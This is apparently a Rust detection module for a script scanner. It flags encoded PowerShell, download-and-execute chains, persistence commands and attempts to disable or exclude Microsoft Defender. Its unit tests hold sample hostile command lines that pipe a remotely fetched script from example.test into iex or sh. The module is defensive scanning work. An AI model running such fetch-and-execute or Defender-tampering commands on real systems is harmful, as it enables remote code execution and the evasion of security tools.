use crate::report::{Evidence, EvidenceKind};

pub fn analyze_script_text(text: &str) -> Vec<Evidence> {
    let lower = text.to_ascii_lowercase();
    let mut evidences = Vec::new();

    if has_encoded_command(&lower) {
        evidences.push(evidence(
            "script.encoded_command",
            "Encoded PowerShell command",
            40,
        ));
    }

    if has_downloader(&lower) && has_execution_sink(&lower) {
        evidences.push(evidence(
            "script.download_execute",
            "Downloads and executes content",
            25,
        ));
    }

    if (contains_invocation(&lower, "curl") || contains_invocation(&lower, "wget"))
        && (lower.contains("| sh") || lower.contains("| bash") || lower.contains("chmod +x"))
    {
        evidences.push(evidence(
            "script.shell_download_execute",
            "Shell script downloads and executes content",
            25,
        ));
    }

    if lower.contains("crontab")
        || lower.contains("systemctl --user enable")
        || lower.contains("launchctl load")
    {
        evidences.push(evidence(
            "script.persistence_command",
            "Script modifies startup persistence",
            25,
        ));
    }

    if lower.contains("add-mppreference") && lower.contains("exclusionpath") {
        evidences.push(evidence(
            "script.defender_exclusion",
            "Adds Microsoft Defender exclusion",
            30,
        ));
    }

    if lower.contains("set-mppreference") && lower.contains("disablerealtimemonitoring") {
        evidences.push(evidence(
            "script.defender_disable",
            "Attempts to disable Defender real-time monitoring",
            35,
        ));
    }

    evidences
}

fn has_encoded_command(command: &str) -> bool {
    command.contains("frombase64string")
        || (has_powershell_invocation(command)
            && (command.contains("-encodedcommand")
                || command
                    .split_whitespace()
                    .any(|part| part == "-enc" || part == "-e")))
}

fn has_powershell_invocation(command: &str) -> bool {
    contains_invocation(command, "powershell") || contains_invocation(command, "pwsh")
}

fn has_downloader(command: &str) -> bool {
    command.contains("downloadfile")
        || command.contains("invoke-webrequest")
        || command.contains("invoke-restmethod")
        || contains_invocation(command, "iwr")
        || contains_invocation(command, "irm")
        || contains_invocation(command, "curl")
        || contains_invocation(command, "wget")
}

fn has_execution_sink(command: &str) -> bool {
    command.contains("start-process")
        || command.contains("cmd /c")
        || command.contains("powershell")
        || command.contains("invoke-expression")
        || contains_invocation(command, "iex")
}

fn contains_invocation(text: &str, command: &str) -> bool {
    text.split(|ch: char| !(ch.is_ascii_alphanumeric() || ch == '-' || ch == '_'))
        .any(|part| part == command)
}

fn evidence(code: &str, title: &str, weight: u8) -> Evidence {
    Evidence {
        kind: EvidenceKind::Script,
        code: code.to_string(),
        title: title.to_string(),
        detail: title.to_string(),
        weight,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_encoded_powershell() {
        let evidences = analyze_script_text("powershell.exe -EncodedCommand SQBFAFgA");
        assert_eq!(evidences[0].code, "script.encoded_command");
    }

    #[test]
    fn detects_short_encoded_powershell() {
        let evidences = analyze_script_text("powershell.exe -nop -enc SQBFAFgA");
        assert!(evidences
            .iter()
            .any(|evidence| evidence.code == "script.encoded_command"));
    }

    #[test]
    fn detects_powershell_short_e_encoded_command() {
        let evidences = analyze_script_text("pwsh -nop -e SQBFAFgA");
        assert!(evidences
            .iter()
            .any(|evidence| evidence.code == "script.encoded_command"));
    }

    #[test]
    fn ignores_shell_test_e_file_checks() {
        let evidences = analyze_script_text(
            r#"
            #!/bin/sh
            if [ ! -e "$_socket_path" ] ; then
                echo "create socket"
            fi
            "#,
        );
        assert!(!evidences
            .iter()
            .any(|evidence| evidence.code == "script.encoded_command"));
    }

    #[test]
    fn detects_iwr_pipe_iex_download_execute() {
        let evidences =
            analyze_script_text("powershell -w hidden -c \"iwr https://example.test/a.ps1 | iex\"");
        assert!(evidences
            .iter()
            .any(|evidence| evidence.code == "script.download_execute"));
    }

    #[test]
    fn detects_shell_download_execute() {
        let evidences = analyze_script_text("curl https://example.test/a.sh | sh");
        assert_eq!(evidences[0].code, "script.shell_download_execute");
    }
}
